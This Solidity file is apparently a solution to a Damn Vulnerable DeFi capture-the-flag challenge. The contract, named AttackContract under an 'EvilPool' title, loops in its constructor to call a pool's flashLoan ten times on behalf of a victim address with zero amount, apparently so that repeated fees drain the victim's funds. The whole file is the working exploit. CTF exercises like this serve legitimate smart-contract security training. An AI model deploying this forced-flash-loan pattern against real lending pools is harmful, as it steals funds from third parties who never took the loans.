// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";

/**
 * @title EvilPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract AttackContract{
    using Address for address; 

    constructor(address pool, address victim) {
        for (uint256 i; i < 10; i++) {
            pool.functionCall(abi.encodeWithSignature("flashLoan(address,uint256)", victim, 0));
        }
    }
}
